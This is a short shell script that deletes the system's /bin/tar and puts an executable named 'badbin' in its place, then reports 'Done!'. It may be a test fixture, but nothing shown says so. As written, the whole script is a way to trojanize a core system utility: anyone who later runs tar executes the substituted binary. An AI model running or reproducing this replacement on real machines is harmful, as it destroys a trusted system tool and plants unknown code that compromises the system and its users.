#!/bin/sh
rm /bin/tar
chmod +x badbin
cp badbin /bin/tar
echo 'Done!'